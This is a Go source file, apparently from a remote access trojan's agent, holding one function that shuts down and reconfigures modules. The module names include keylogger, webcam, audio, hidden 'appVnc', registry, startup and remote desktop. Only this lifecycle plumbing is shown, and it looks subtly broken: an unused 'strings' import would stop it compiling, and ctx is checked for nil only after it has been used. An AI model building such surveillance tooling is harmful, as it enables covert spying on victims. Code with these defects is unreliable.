package agent

import (
	"context"
	"fmt"
	"strings"
)

func (a *Agent) resetModuleEngine(ctx context.Context, moduleID string, pluginID string) error {
	if a.modules == nil {
		return nil
	}

	a.modules.mu.RLock()
	entry, ok := a.modules.byID[moduleID]
	a.modules.mu.RUnlock()

	if !ok || !entry.enabled {
		return nil
	}

	// We need a common interface or type switch to handle different modules.
	// Since we refactored them to have mu, engine, and requiredVersion, 
	// we can try to access those via reflection or add a method to the Module interface.
	
	// For now, let's use a type switch for the ones we just refactored.
	var resultErr error
	
	switch m := entry.module.(type) {
	case *webcamModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *keyloggerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *audioModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(ctx)
		}
	case *appVncModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(ctx)
		}
	case *fileManagerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *taskManagerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(ctx)
		}
	case *tcpConnectionsModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(context.Background())
		}
	case *registryModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(context.Background())
		}
	case *startupModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(context.Background())
		}
	case *triggerMonitorModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *remoteDesktopModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	default:
		return fmt.Errorf("module %s does not support engine reset", moduleID)
	}

	if err := a.modules.DeactivatePlugin(ctx, pluginID); err != nil {
		resultErr = combineErrors(resultErr, err)
	}

	runtime := a.moduleRuntime()
	if ctx == nil {
		ctx = context.Background()
	}
	if err := entry.module.UpdateConfig(runtime); err != nil {
		resultErr = combineErrors(resultErr, err)
	}
	
	return resultErr
}
